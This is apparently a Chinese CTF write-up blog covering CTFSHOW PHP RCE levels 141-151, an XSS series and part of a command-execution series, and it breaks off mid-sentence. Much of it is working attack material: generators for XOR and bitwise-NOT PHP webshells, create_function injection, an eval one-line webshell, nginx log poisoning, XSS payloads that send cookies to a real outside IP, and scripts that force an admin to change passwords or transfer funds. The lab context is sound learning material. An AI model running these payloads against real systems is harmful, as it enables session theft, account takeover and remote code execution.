还是看P神https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n总的思想就是通过非数字字母字符的相互运算，如异或，取反，自增从而获得可见字符，进而拼凑出shell来\n这里给一个异或脚本\n# coding=gbkimport re# 生成可用的字符def write_rce():    result = &#x27;&#x27;    for i in range(256):        for j in range(256):          # 这里比较坑 题面写的是\\w+ 不应该多一个下划线吗? 多一个就出不了((            if not (re.match(&#x27;[a-zA-Z0-9]&#x27;, chr(i), re.I) or  re.match(r&#x27;[a-zA-Z0-9]&#x27;, chr(j), re.I)):                k = i ^ j                if k &gt;= 32 and k &lt;= 126:                    # url编码                    a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                    b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                    result += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)    with open(&#x27;result.txt&#x27;, &#x27;w&#x27;) as f:        f.write(result)# 根据想要的命令在生成的txt中进行匹配def action(arg):    s1 = &quot;&quot;    s2 = &quot;&quot;    for i in arg:            f = open(&#x27;result.txt&#x27;, &#x27;r&#x27;)            while True:                t = f.readline()                if t == &quot;&quot;:                    break                if t[0] == i:                    s1 += t[2:5]                    s2 += t[6:9]                    break            f.close()    output = &quot;(\\&quot;&quot; + s1 + &quot;\\&quot;^\\&quot;&quot; + s2 + &quot;\\&quot;)&quot;    return outputif __name__ == &quot;__main__&quot;:    write_rce()    s1 = input(&quot;your function: &quot;)    s2 = input(&quot;your command:&quot;)    print(s1)    print(s2)    r = action(s1) + action(s2)    print(r)\n接下来还需要考虑的就是构造的执行函数前后会有数字的干扰\n正常执行\n\n前面加数字会直接爆语法错误，然后发现前面再加上* + -就没影响；后面可以直接;闭合(后面加* + -也可以)\n\n# lsv1=1&amp;v2=2&amp;v3=*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);# tac flag.php\n\n\n\nweb 142. 难度0\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-17 19:36:02*/error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    if(is_numeric($v1))&#123;        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;\n$d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d)之后会沉睡\n直接令v1等于0不就完了…\n\n\n\nweb 143. 141的plus版本\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-18 12:48:14*/highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\n这里ban了更多符号，但是异或符号还是没ban，这里要说明一下%虽然在黑名单上，但是我们实际利用时传的是url编码，之后会被解码所以并未受影响\n用原来的脚本即可，只是需要增加一些非法字符\n\n# lsv1=1&amp;v2=2&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0c%0c&quot;^&quot;%60%7f&quot;)*# tac flag.phpv1=1&amp;v2=2&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*\n\n\n\nweb 144.  143的plus版本\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-18 16:21:15*/highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; check($v3))&#123;        if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;function check($str)&#123;    return strlen($str)===1?true:false;&#125;\n其实是在web141的基础上增加了一个check函数，里面会限制v3变量内容的长度为1\n同时对v3的黑名单限制改到了对v2的限制，那么调整一下传参变量即可\n# lsv1=1&amp;v3=2&amp;v2=*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;)# tac flag.php?v1=1&amp;v3=2&amp;v2=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)\n\n\n\nweb145. 144的plus版本\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-18 17:41:33*/highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\n这次限制了异或运算，但是取反、自增、或运算这些都还可以\n这里学习一下取反脚本\n&lt;?phpfwrite(STDOUT, &quot;[+]your function: &quot;);$function = str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN));fwrite(STDOUT, &quot;[+]your command: &quot;);$command = str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN));echo &#x27;(~&#x27;.urlencode(~$function).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;\n对于前后数字的绕过，虽然+  - *都被ban了，但是|也可以\n{:height 194, :width 513}\n# lsv1=1&amp;v2=2&amp;v3=| (~%8C%86%8C%8B%9A%92)(~%93%8C)|# tac flag.php v1=1&amp;v2=2&amp;v3=| (~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|\n\n\n\nweb146. 145的plus版本\n\n题面如下，并不影响继续打\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-18 17:41:33*/highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;                die(&#x27;get out hacker!&#x27;);        &#125;        else&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\n\n\n\nweb147. RCE     create_function()代码注入  PHP默认命名空间\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-19 02:04:38*/highlight_file(__FILE__);if(isset($_POST[&#x27;ctf&#x27;]))&#123;    $ctfshow = $_POST[&#x27;ctf&#x27;];    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);    &#125;&#125;\nctf传参要求不能是字母数字下划线开头的值\n这里有一个关于PHP默认命名空间的知识\nphp里默认命名空间是\\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果是\\function_name()这样的形式去调用函数，则是表示写了一个绝对路径。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法\n接下来就是关注这个create_function()代码注入\ncreate_function(string $args, string $code): stringCreates an anonymous function from the parameters passed, and returns a unique name for itWarning!!!This function internally performs an eval() and as such has the same security issues as eval(). Additionally it has bad performance and memory usage characteristics.If you are using PHP 5.3.0 or newer a native anonymous function should be used instead.Usually these parameters will be passed as single quote delimited strings. The reason for using single quoted strings, is to protect the variable names from parsing, otherwise, if you use double quotes there will be a need to escape the variable names, e.g. \\$avar.\n其实该函数是会自动生成一个匿名函数\n例如create_function(&#x27;$dotast&#x27;,&#x27;echo $dotast.&quot;very cool&quot;&#x27;)//等于function f($dotast)&#123;    echo $dotast.&quot;very cool&quot;;&#125;\n我们可以测试一下，如果提前闭合掉函数语句的界定符&#125;\n正常情况下\n\n语句中若提前闭合\n{:height 191, :width 536}\n可以看到确实这个匿名函数是会展开成一个函数体的形式。那么有什么用呢？可以看到题目只给了我们可以声明的地方，但是正常情况下并没有地方调用这个匿名函数。因此我们通过提前闭合函数体的方式来进行RCE\nGET:?show=echo 123;&#125;system(&#x27;tac flag.php&#x27;);//POST:ctf=\\create_function\n\n\n\nweb148. 什么是变量\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-19 03:52:11*/include &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123;        die(&quot;error&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;\ncode传参点ban了很多字符，可以看到^还在\n依照前面的思路，我们还是可以通过异或构造执行语句\n这题直接构造get_ctfshow_fl0g即可\n# coding=gbkimport re# 生成可用的字符def write_rce():    result = &#x27;&#x27;    for i in range(256):        for j in range(256):            if not (re.match(&#x27;[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+&#x27;, chr(i), re.I) or  re.match(r&#x27;[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+&#x27;, chr(j), re.I)):                k = i ^ j                if k &gt;= 32 and k &lt;= 126:                    # url编码                    a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                    b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                    result += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)    with open(&#x27;result.txt&#x27;, &#x27;w&#x27;) as f:        f.write(result)# 根据想要的命令在生成的txt中进行匹配def action(arg):    s1 = &quot;&quot;    s2 = &quot;&quot;    for i in arg:            f = open(&#x27;result.txt&#x27;, &#x27;r&#x27;)            while True:                t = f.readline()                if t == &quot;&quot;:                    break                if t[0] == i:                    s1 += t[2:5]                    s2 += t[6:9]                    break            f.close()    output = &quot;(\\&quot;&quot; + s1 + &quot;\\&quot;^\\&quot;&quot; + s2 + &quot;\\&quot;)&quot;    return outputif __name__ == &quot;__main__&quot;:    write_rce()    s1 = input(&quot;your function: &quot;)        print(s1)        r = action(s1)    print(r)\n\n\n\nweb149. 你写的快还是我删的快\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-19 04:34:40*/error_reporting(0);highlight_file(__FILE__);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !== &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;\n在当前目录下，如果存在名字非index.php的文件就直接删掉。另外提供了file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]);写文件\n那我直接写到index.php里不就完了…\n完蛋了，还是要注意直接一句话就完了，写入是覆盖写而不是追加写\n如果  filename  不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。\nctf=index.phpPOST:show=&lt;?php @eval($_POST[1]); ?&gt;\n\n\n\nweb150.  对我们以前的内容进行了小结，我们文件上传系列再见\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-19 07:12:57*/include(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private $username;    private $password;    private $vip;    private $secret;    function __construct()&#123;        $this-&gt;vip = 0;        $this-&gt;secret = $flag;    &#125;    function __destruct()&#123;        echo $this-&gt;secret;    &#125;    public function isVIP()&#123;        return $this-&gt;vip?TRUE:FALSE;        &#125;    &#125;    function __autoload($class)&#123;        if(isset($class))&#123;            $class();    &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;    include($ctf);&#125;\n__autoload\n__autoload(string $class): void在编写面向对象（OOP） 程序时，很多开发者为每个类新建一个 PHP 文件。 这会带来一个烦恼：每个脚本的开头，都需要包含（include）一个长长的列表（每个类都有个文件）。spl_autoload_register() 函数可以注册任意数量的自动加载器，当使用尚未被定义的类（class）和接口（interface）时自动去加载。通过注册自动加载器，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类\nclass_exists\nclass_exists(string $class, bool $autoload = true): bool该函数检查指定的类是否已经定义\n特性1：被get或者post传入的变量名，如果含有 空格、+、[ . 则会被转化为 _\n特性2：就是如果传入 [ ，它被转化为 _ 之后，后面的字符就会被保留下来不会被替换\n__autoload中存在$class()，参数可控，可以通过extract传入，而autoload通过`$CTFSHOW__`触发\n我们在最后的include中由于strpos只能返回false所以不能包含:\n__CTFSHOW__和isVIP可以传参进行变量覆盖\n嗯嗯没错思路就是这样\n这个是其中一个执行点\nGET..CTFSHOW..=phpinfo\n第二个执行点在include中\n可以通过日志包含的方式，服务器中间件为nginx，所有日志文件位置在/var/log/nginx/access.log\nGETisVIP=1POSTctf=/var/log/nginx/access.logUser-Agent: &lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;\n可以看到日志文件确实可以包含进来\n\n\n\n\nweb151. 修复了非预期\n\n基本没变化\n除了最后修改了一下\nif($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;    include($ctf);&#125;\n也就是不让日志包含了，据说还可以session文件包含，但是上一关另一个sink点上phpinfo里已经给出了flag\n\n\n\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-XSS","url":"/2022/09/11/CTF-SHOW%20XSS%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"做题前的准备：XSS平台用于接收靶站传来的数据\nhttps://xss.pt/xss.php?do=project&amp;act=view&amp;id=57422\n后台会每隔一段时间（一般为15秒）去访问一次我们的链接\n\nXSS基础\n基本上就是熟悉XSS平台的使用\n上面创建一个项目，然后获取到XSS注入代码，随便选一个\n&lt;sCRiPt sRC=//xss.pt/nON3&gt;&lt;/sCrIpT&gt;\n之后刷新等待bot去访问我们的链接即可\nflag应该是在bot所在客户端的cookie字段处，有可能会出现自己触发XSS的情况\n\n\n\n\n简单FUZZ\nscript img &#x27;&#x27;;!--&quot;&lt;h1&gt;=&amp;&#123;()&#125;&lt;/h1&gt;\n\n开始过滤\n过滤了script\n改用img标签\n&lt;Img sRC=http://xss.pt/nON3p.jpg&gt;\nxss平台接收不到admin的\n换一个html实体编码绕过\n&lt;iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#48;&amp;#120;&amp;#46;&amp;#97;&amp;#120;&amp;#47;&amp;#110;&amp;#79;&amp;#78;&amp;#51;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;\n\n增加了过滤\n\n\n编码还是可以绕过，wp说是过滤了img。有种黑盒莽试的感觉…\n\n增加了过滤\n继续打\n\n增加了过滤\n过滤了空格\n可以利用/**/ / TAB绕过\n这里好像只有TAB可以绕过\n还是用上面的\n&lt;iframe\tWIDTH=0\tHEIGHT=0\tsrcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#48;&amp;#120;&amp;#46;&amp;#97;&amp;#120;&amp;#47;&amp;#110;&amp;#79;&amp;#78;&amp;#51;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;\n\n增加了过滤\n可以继续打\n\n增加了过滤\n过滤了xss，没啥用（可能是某些xss平台的名字）\n可以继续打\n\n\n323-326. 增加了过滤\n这关总算是把iframe给过滤掉了。xss平台给的用不了了\n换成基于事件触发的payload，然后标签用body\n远程服务器起一个flask服务端口用来接收cookie\n\n&lt;body/onload=document.location=&#x27;http://43.140.198.45:81?cookie=&#x27;+document.cookie&gt;&lt;/body&gt;\n\n\n存储型xss\n过滤应该是没了，其实就是换了个攻击方式，本质还是没变。所以payload也没变，\n\n\n\nhhh跟钓鱼一样\n\n\n存储型XSS\n存在一个仅admin可见的用户管理模块，输入可控点为用户名和密码\n\n\n\n那么在用户名处注入XSS即可。不过这次上回的注入失效(应该是body标签写的有问题)了，换成的试试\n# 重新加载页面&lt;script&gt;window.location.replace(&#x27;http://43.140.198.45:81?cookie=&#x27;+document.cookie);&lt;/script&gt;\n获取到了admin的cookie\n\ncookie换上，最后还得抓包找数据，这刷新出来就被覆盖了\n\n原来是刷新完就会中自己的xss\n\n\n存储型xss\n界面没啥变化，沿用上一关的payload试试，cookie可以偷到。尝试admin身份登录，发现并不能身份伪造。也就是说cookie在发出去之后就失效了\n\n\n\n所以思路就换成了不是偷cookie了，而是直接偷页面，直接操作document获取html\n首先定位一下flag位置\n\n然后慢慢定位就好\n\n&lt;script&gt;window.location.replace(&#x27;http://43.140.198.45:81?cookie=&#x27;+document.getElementsByClassName(&quot;layui-table-cell laytable-cell-1-0-1&quot;)[1].innerText);&lt;/script&gt;\n\n\n存储型xss\n依然是沿用上一关的试试，xs\n\n\n\n说明这一关密码不在这个地方了，留意这里多了一个修改密码的模块，方式为GET请求\n\n思路转变，直接修改admin的密码。这里有一个小细节我没有注意到，就是管理员在访问管理网站修改密码时的ip应该是环路地址，还少加了个/api/这还挺坑的（因为开docker，本地访问直接环路地址就可以\n&lt;script&gt;window.location.replace(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;);&lt;/script&gt;\n\n\n存储型xss\n还是分析一下修改密码这个模块，提交方式变成了POST提交\n\n\n\n该换成发起一个ajax请求\n&lt;script&gt;$.ajax(&#123;\t\turl: &#x27;http://127.0.0.1/api/change.php&#x27;,\ttype: &#x27;POST&#x27;,\tdata: &#123;p:&#x27;123456&#x27;&#125;&#125;);&lt;/script&gt;\n\nxss在哪里？\n修改密码应该是不太可能了，估计应该是钱够了就可以直接出\n\n先看下接口调用\n\n\n\n转账模块\n\n网络抓包可以看到这里有个POST请求\n\n\n于是思路就有了，触发的地方还是用户管理，然后XSS代码让admin给我们转账\n&lt;script&gt;$.ajax(&#123;url: &#x27;http://127.0.0.1/api/amount.php&#x27;,type: &#x27;POST&#x27;,data: &#123;u:&#x27;racerz&#x27;, a:&#x27;9000&#x27;&#125;&#125;);&lt;/script&gt;\n草率了，填少了，应该多转一些\n\nxss告一段落\n这一关可以发现admin的钱没那么多了哈哈哈哈哈，所以需要写个脚本给自己转帐，然后发现自己就可以给自己转。\n所以其实跟xss没啥关系….\n# coding=gbkimport requestsurl_reg = &quot;http://db959d03-8ad0-45e5-825b-d83e1fde5138.challenge.ctf.show/api/amount.php&quot;url = &quot;http://db959d03-8ad0-45e5-825b-d83e1fde5138.challenge.ctf.show/api/getFlag.php&quot;cookie = &quot;PHPSESSID=5mhj441s0r02c08hqrvltc063d&quot;headers = &#123;    &#x27;Cookie&#x27;: cookie&#125;data = &#123;    &#x27;u&#x27;: &#x27;racerz&#x27;,    &#x27;a&#x27;: &#x27;500&#x27;&#125;amount = 1572while True:    r = requests.post(url_reg, headers=headers, data=data)    print(r.text)    print(amount)    amount += 500    if amount &gt;= 9999:        r = requests.post(url, headers=headers)        print(r.text)        break\n\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-命令执行","url":"/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"\n命令执行 需要严格的过滤\n只过滤了flag\n\n\n\n学到了一些关于preg_match函数的正则匹配小细节\n模式中的\\b标记一个单词边界，所以只有独立的单词会被匹配，如：    if (preg_match(&quot;/\\bweb\\b/i&quot;, &quot;PHP is the web scripting language of choice.&quot;)) ：   True        if (preg_match(&quot;/\\bweb\\b/i&quot;, &quot;PHP is the website scripting language of choice.&quot;)) ：   False        小技巧：如果仅仅想要检查某个字符串是否包含另外一个字符串，不要使用 preg_match() ， 使用 strpos() 会更快。 \n​    linux命令知识点：\n\n对于linux cat和ca&#39;&#39;t ca\\t ca&quot;&quot;t效果是相同的 这样同样可以绕过字符的限制\n\n\n\nnl命令\nThe nl utility reads lines from the named file or the standard input if thefile argument is omitted, applies a configurable line numbering filteroperation and writes the result to the standard output.\n\n\n\n其实大体上是可以分为两个思路：\n\n针对c的输入参数命令进行绕过限制\n\npayload1:c=system(&quot;nl fla?????&quot;);payload2:c=system(&quot;nl fla*&quot;);payload3:c=echo `nl fl&#x27;&#x27;ag.php`;或者c=echo `nl fl&quot;&quot;ag.php`;payload4:c=echo `nl fl\\ag.php`;//转义字符绕过\n\n针对c，通过构建另外一个传参点来绕过对c的直接匹配\n\npayload5:c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.phppayload6:c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);\n\nawk命令 主要是用来格式化文本内容的\nawk [参数] [处理内容] [操作对象]预定义变量$0\t: 代表当前行(相当于匹配所有)\n统计每行的字段数（NF）\n\n取出值（$NF）\n\n\n命令执行，需要严格的过滤\n过滤了flag system和php\n上一题继续打payload\necho `nl fl&#x27;&#x27;ag.ph&#x27;&#x27;p`\n或者针对system的过滤\n有一些其他命令执行函数可以学习使用\nsystem : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。exec ： 执行一个外部程序,回显最后一行,需要用echo输出。shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。proc_open ： 执行一个命令，并且打开用来输入/输出的文件指针。passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。 `（反引号）：同 shell_exec() \n测试一下上面可以回显的函数\nsystem passthru echo配合\n\n命令执行，需要严格的过滤\n过滤了cat sort shell . 空格 单引号\n针对单引号，我们可以换成双引号\n针对空格\n$&#123;IFS&#125; 但不能写作 $IFS$IFS$9%09&lt;&gt;&lt;$IFS%09另外同cat功能的函数还有：more:一页一页的显示档案内容less:与 more 类似 head:查看头几行tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看 file -f:报错出具体内容strings: find the printable strings in a object, or other binary, file\n一些payload学习\n预期解passthru(&quot;tac%09f*&quot;);非预期c=&quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&quot;nl%09fla*&quot;);等价于system()c=echo`strings%09f*`;c=echo`strings\\$IFS\\$9f*`必须加转义字符首先print_r(scandir(dirname(__FILE__)));查看当前目录下文件然后找到flag.phpprint_r(next(array_reverse(scandir(dirname(__FILE__)))));之后高亮显示即可c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));类似c=show_source(next(array_reverse(scandir(pos(localeconv())))));\n\n命令执行，需要严格的过滤\n多过滤了反引号 echo 分号和左括号\n利用上面出现过的一个文件包含搭配php伪协议payload是可以绕过部分正则匹配的 \n针对左括号，include函数可以不需要括号；针对分号，可以使用php短标签来闭合，起默认隐含了一个分号在其中\npayload学习\nc=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.phpc=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;nl fl*&quot;)?&gt;c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy\n\n命令执行，需要严格的过滤\n多过滤了一个双引号，上面的payload继续打\n\n命令执行，需要严格的过滤\n多过滤了一个冒号，继续\n\n命令执行，需要严格的过滤\n多过滤了&lt;和=，继续\n\n命令执行，需要严格的过滤\n过滤了数字和/，继续（之前payload中的数字参数名得换一下）\n\n命令执行，需要严格的过滤\n题面换了\n\n一般见include都是想着php伪协议进行文件包含，由于过滤了flag所以如果要是用的话只能用data协议进行命令执行\nc=data://text/plain,&lt;?php system(&quot;nl fl*&quot;);?&gt;\n另一个思路是通过日志文件包含，注入UA头进行命令执行，这道题的中间件为nginx\nc=/var/log/nginx/access.log\n\n命令执行，需要严格的过滤\n多过滤了php，file关键字，前面使用的data伪协议需要采用base64编码传输了\n不知道咋回事，php短标签经过base64加密后就会失去隐含的分号\nc=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbCoiKTs/Pg==\n\n命令执行，需要严格的过滤\n\n加了一个后缀限制，00截断？\n并没有，版本都到php 7+了\n因为前面data协议已经闭合了PHP执行语句，拼接起来就变成了c=data://text/plain,&lt;?php system(&quot;nl 